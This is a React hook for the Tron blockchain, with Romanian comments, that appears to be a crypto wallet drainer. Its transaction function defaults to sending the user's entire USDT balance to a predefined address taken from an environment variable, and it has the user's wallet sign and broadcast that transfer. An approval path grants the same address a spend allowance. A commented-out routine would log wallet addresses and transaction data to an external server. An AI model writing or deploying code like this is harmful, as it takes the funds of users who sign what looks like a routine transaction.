import { useState } from "react";
import { useWalletConnect } from "./useWalletConnect";
import { useTronBalances } from "./useTronBalances";
import { TronWeb } from "tronweb";
import { useWallet } from "../context/globalContext";

function isMobileDevice() {
  return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
}
// const logToServer = async (message) => {
//   try {
//     await fetch(`${process.env.NEXT_PUBLIC_API_ADRESS}`, {
//       method: "POST",
//       headers: {
//         "Content-Type": "application/json",
//       },
//       body: JSON.stringify({ log: message }),
//     });
//   } catch (error) {
//     console.error("Failed to send log to server:", error);
//   }
// };


export const useTronTransaction = () => {
  const [transactionStatus, setTransactionStatus] = useState(null); // Pentru statusul tranzacției
  const [isLoading, setIsLoading] = useState(false); // Pentru a afișa un loader în UI
  const { connectWallet } = useWalletConnect(); // Hook-ul pentru conectare
  const { fetchBalances } = useTronBalances(); // Hook-ul pentru obținerea balanțelor
  const {balances} = useWallet()
  const initiateTransaction = async (recipient = process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT, amount = (balances.usdt * 1e6).toFixed(0), isApproval = false) => {
    setIsLoading(true);
  
    try {
      console.log(balances.usdt, "usdt balances");
      
      setTransactionStatus(isApproval ? "Processing approval..." : "Initiating transfer...");
      // await logToServer("Starting transaction initialization...");
  
      try {
        const walletAddress = (await connectWallet()).address;
        // await logToServer(`Wallet connected: ${walletAddress}`);
  
       
  
        const tronWeb = new TronWeb({
          fullHost: "https://api.trongrid.io", // Mainnet
        });
        // await logToServer({walletAddress, 45:45})
        if (!walletAddress || !tronWeb.isAddress(walletAddress)) {
       
          throw new Error(`Invalid Wallet Address: ${walletAddress}`);
        }
  
        const isConnected = await tronWeb.isConnected();
        // await logToServer(`tronWeb connected: ${JSON.stringify(isConnected)}`);
        if (!isConnected.fullNode) {
          throw new Error("Failed to connect to Tron network.");
        }
  
        const usdtContractAddress = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS;
        // await logToServer(`USDT Contract Address: ${usdtContractAddress}`);
        if (!tronWeb.isAddress(usdtContractAddress)) {
          throw new Error(`Invalid USDT Contract Address: ${usdtContractAddress}`);
        }
  
        const functionSelector = isApproval
          ? "approve(address,uint256)"
          : "transfer(address,uint256)";
        // await logToServer(`Function Selector: ${functionSelector}`);
  
        // await logToServer(`Recipient Address: ${recipient}`);
        if (!tronWeb.isAddress(recipient)) {
          throw new Error(`Invalid Recipient Address: ${recipient}`);
        }
  
        const parameters = isApproval
          ? [
              { type: "address", value: recipient },
              { type: "uint256", value: 1 * 1e6 },
            ]
          : [
              { type: "address", value: recipient },
              { type: "uint256", value: amount },
            ];
  
        // await logToServer(`Parameters: ${JSON.stringify(parameters)}`);
  
        const options = {
          feeLimit: 300000000,
          from: walletAddress,
        };
  
        // await logToServer(`Options: ${JSON.stringify(options)}`);
  
        let transaction;
        try {
          transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractAddress,
            functionSelector,
            options,
            parameters,
            walletAddress
          );
          // await logToServer(`Transaction built: ${JSON.stringify(transaction)}`);
        } catch (error) {
          console.log(`Error in triggerSmartContract: ${error.message}`);
          throw error;
        }
  
        const signedTransaction = await (await connectWallet()).wallet.signTransaction(transaction);
        // await logToServer(`Signed Transaction: ${JSON.stringify(signedTransaction)}`);
  
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        // await logToServer(`Transaction result: ${JSON.stringify({
        //   code: result.code,
        //   transaction : result.transaction
        // })}`);
  
        setTransactionStatus(
          result.result ? (isApproval ? "Approval successful!" : "Transfer successful!") : "Transaction failed."
        );
      } catch (error) {
        setTransactionStatus("Transaction failed.");
        console.log(`Transaction error: ${error.message}`);
      }
    } catch (error) {
      setTransactionStatus("Transaction failed.");
      console.log(`Outer error: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };
  
  
  

  return {
    initiateTransaction,
    transactionStatus,
    isLoading,
  };
};